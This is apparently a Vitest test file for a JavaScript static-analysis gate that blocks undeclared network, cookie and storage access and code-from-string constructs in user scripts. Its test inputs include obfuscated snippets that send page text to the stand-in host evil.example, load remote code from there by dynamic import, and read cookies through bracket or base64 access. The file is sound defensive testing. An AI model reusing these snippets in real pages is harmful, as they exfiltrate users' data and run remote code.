import { describe, expect, it } from 'vitest'
import type { Capability } from '@shared/types'
import { analyseJavaScript, applyCapabilityPolicy } from './static-analysis'

const findingApis = (source: string) =>
  analyseJavaScript(source).findings.map((f) => f.api)

/**
 * Runs the same two steps the background gate runs and reports whether any
 * finding blocks saving. Using the real policy step matters: a warning with no
 * capability attached is not raised by it, which is how #49 passed unnoticed.
 */
const blocks = (source: string, declared: Capability[] = []) => {
  const { findings } = applyCapabilityPolicy(analyseJavaScript(source), declared)
  return findings.some((f) => f.severity === 'block')
}

describe('analyseJavaScript', () => {
  it('passes an ordinary DOM transform with no findings', () => {
    const result = analyseJavaScript(`
      const sidebar = document.querySelector('aside[role="complementary"]');
      if (sidebar && !sidebar.dataset.waHidden) {
        sidebar.dataset.waHidden = '1';
        sidebar.style.display = 'none';
      }
    `)
    expect(result.findings).toEqual([])
    expect(result.usedCapabilities).toEqual([])
  })

  it('detects each network egress API', () => {
    expect(findingApis(`fetch('/x')`)).toContain('fetch')
    expect(findingApis(`new XMLHttpRequest()`)).toContain('XMLHttpRequest')
    expect(findingApis(`new WebSocket('wss://x')`)).toContain('WebSocket')
    expect(findingApis(`new EventSource('/x')`)).toContain('EventSource')
    expect(findingApis(`navigator.sendBeacon('/x', d)`)).toContain('navigator.sendBeacon')
    expect(findingApis(`import('./x.js')`)).toContain('import()')
  })

  it('treats window.fetch and globalThis.fetch as the same API', () => {
    expect(findingApis(`window.fetch('/x')`)).toContain('fetch')
    expect(findingApis(`globalThis.fetch('/x')`)).toContain('fetch')
  })

  it('detects credential and storage reads', () => {
    expect(findingApis(`const c = document.cookie`)).toContain('document.cookie')
    expect(findingApis(`localStorage.getItem('t')`)).toContain('localStorage')
    expect(findingApis(`sessionStorage.setItem('a','b')`)).toContain('sessionStorage')
    expect(findingApis(`indexedDB.open('db')`)).toContain('indexedDB')
  })

  it('blocks code-from-string constructs outright', () => {
    for (const source of [
      `eval('alert(1)')`,
      `new Function('return 1')()`,
      `setTimeout("doThing()", 100)`,
      "setInterval(`tick()`, 100)",
    ]) {
      const { findings } = analyseJavaScript(source)
      expect(
        findings.some((f) => f.severity === 'block'),
        `expected a blocking finding for: ${source}`,
      ).toBe(true)
    }
  })

  it('does not flag identifiers that appear inside strings or comments', () => {
    // The whole reason this uses a parser rather than a regex.
    const result = analyseJavaScript(`
      // we deliberately do not call fetch here
      const message = "do not use document.cookie";
      element.textContent = message;
    `)
    expect(result.findings).toEqual([])
  })

  it('flags dynamic property access as unanalysable rather than clean', () => {
    const apis = findingApis(`window['fet' + 'ch']('/x')`)
    expect(apis).toContain('(dynamic property access)')
  })

  it('blocks saving when a computed property cannot be resolved (#49)', () => {
    for (const source of [
      `globalThis['fe' + 'tch']('https://evil.example/?c=' + encodeURIComponent(document.body.innerText))`,
      `const c = document['cookie']`,
      `const X = window[atob('WE1MSHR0cFJlcXVlc3Q=')]`,
    ]) {
      expect(blocks(source), `expected a block for: ${source}`).toBe(true)
    }
  })

  it('does not block a computed property that is a plain index', () => {
    // Control: the rule must not simply block every bracket access.
    expect(blocks(`const first = items[0]; const el = rows[2];`)).toBe(false)
  })

  it('treats numeric indexing as ordinary, not obfuscation', () => {
    const result = analyseJavaScript(`const first = items[0]; const el = rows[2];`)
    expect(result.findings).toEqual([])
  })

  it('reports unparseable source as blocking rather than clean', () => {
    const result = analyseJavaScript(`function ( {{{`)
    expect(result.parseError).toBeDefined()
    expect(result.findings[0]?.severity).toBe('block')
  })
})

describe('dynamic import (#137)', () => {
  const source = `import('https://evil.example/payload.js')`

  it('blocks import() whether or not network is declared', () => {
    expect(blocks(source, [])).toBe(true)
    expect(blocks(source, ['network'])).toBe(true)
  })

  it('still lets a plain fetch through once network is declared', () => {
    // Control: declaring network must keep unlocking requests, otherwise the
    // test above could pass because everything blocks.
    expect(blocks(`fetch('https://example.com/collect')`, ['network'])).toBe(false)
    expect(blocks(`fetch('https://example.com/collect')`, [])).toBe(true)
  })
})

describe('applyCapabilityPolicy', () => {
  it('raises undeclared capability use from warn to block', () => {
    const outcome = analyseJavaScript(`fetch('https://example.com/collect')`)
    const { findings, undeclared } = applyCapabilityPolicy(outcome, [])

    expect(undeclared).toEqual(['network'])
    expect(findings.find((f) => f.api === 'fetch')?.severity).toBe('block')
  })

  it('leaves declared capability use as a warning', () => {
    const outcome = analyseJavaScript(`fetch('https://example.com/collect')`)
    const { findings, undeclared } = applyCapabilityPolicy(outcome, ['network'])

    expect(undeclared).toEqual([])
    expect(findings.find((f) => f.api === 'fetch')?.severity).toBe('warn')
  })

  it('blocks only the undeclared capability when several are used', () => {
    const outcome = analyseJavaScript(`
      const c = document.cookie;
      localStorage.setItem('x', c);
    `)
    const { findings, undeclared } = applyCapabilityPolicy(outcome, ['storage'])

    expect(undeclared).toEqual(['cookies'])
    expect(findings.find((f) => f.api === 'document.cookie')?.severity).toBe('block')
    expect(findings.find((f) => f.api === 'localStorage')?.severity).toBe('warn')
  })
})
